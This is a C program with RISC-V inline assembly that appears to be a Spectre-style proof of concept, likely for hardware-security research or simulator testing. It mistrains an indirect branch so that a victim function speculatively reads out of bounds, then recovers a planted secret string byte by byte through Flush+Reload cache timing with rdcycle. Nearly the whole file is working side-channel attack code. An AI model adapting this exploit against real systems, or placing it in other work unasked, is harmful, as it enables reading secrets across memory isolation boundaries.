#include <stdio.h>
#include <stdint.h> 
#include "encoding.h"
#include "cache.h"

#define TRAIN_TIMES 6 
#define ROUNDS 1
#define ATTACK_SAME_ROUNDS 10
#define SECRET_SZ 26
#define CACHE_HIT_THRESHOLD 50

uint64_t array1_sz = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
char* secretString = "!\"#ThisIsTheBabyBoomerTest";

void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray){
    outValArray[0] = 0;
    outValArray[1] = 0;

    for (uint64_t i = 0; i < inArraySize; ++i){
        if (inArray[i] > outValArray[0]){
            outValArray[1] = outValArray[0];
            outValArray[0] = inArray[i];
            outIdxArray[1] = outIdxArray[0];
            outIdxArray[0] = i;
        }
        else if (inArray[i] > outValArray[1]){
            outValArray[1] = inArray[i];
            outIdxArray[1] = i;
        }
    }
}

void wantFunc(){
    asm("nop");
}

void victimFunc(uint64_t idx){
    uint8_t dummy = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
}

int main(void){
    uint64_t wantAddr = (uint64_t)(&wantFunc); 
    uint64_t victimAddr = (uint64_t)(&victimFunc);
    uint64_t start, diff, passInAddr;
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
    uint64_t passInIdx, randIdx;
    uint8_t dummy = 0;
    static uint64_t results[256];

    printf("the secret key is:%s \n", secretString);

    for(uint64_t len = 0; len < SECRET_SZ; ++len){

        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
            results[cIdx] = 0;
        }

        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){

            flushCache((uint64_t)array2, sizeof(array2));

            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){

                passInAddr = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; 
                passInAddr = (passInAddr | (passInAddr >> 16)); 
                passInAddr = victimAddr ^ (passInAddr & (wantAddr ^ victimAddr)); 

                randIdx = atkRound % array1_sz;
                passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; 
                passInIdx = (passInIdx | (passInIdx >> 16)); 
                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); 

                for(uint64_t k = 0; k < 30; ++k){
                    asm("");
                }

                asm("addi %[addr], %[addr], -2\n"
                    "addi t1, zero, 2\n"
                    "slli t2, t1, 0x4\n"
                    "fcvt.s.lu fa4, t1\n"
                    "fcvt.s.lu fa5, t2\n"
                    "fdiv.s	fa5, fa5, fa4\n"
                    "fdiv.s	fa5, fa5, fa4\n"
                    "fdiv.s	fa5, fa5, fa4\n"
                    "fdiv.s	fa5, fa5, fa4\n"
                    "fcvt.lu.s	t2, fa5, rtz\n"
                    "add %[addr], %[addr], t2\n"
                    "mv a0, %[arg]\n"
                    "jalr ra, %[addr], 0\n"
                    :
                    : [addr] "r" (passInAddr), [arg] "r" (passInIdx)
                    : "t1", "t2", "fa4", "fa5");
            }

            for (uint64_t i = 0; i < 256; ++i){
                start = rdcycle();
                dummy &= array2[i * L1_BLOCK_SZ_BYTES];
                diff = (rdcycle() - start);
                if ( diff < CACHE_HIT_THRESHOLD ){
                    results[i] += 1;
                }
            }
        }
        
        uint8_t output[2];
        uint64_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);

        printf("m[0x%p] = want(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]); 

        ++attackIdx;
    }

    return 0;
}
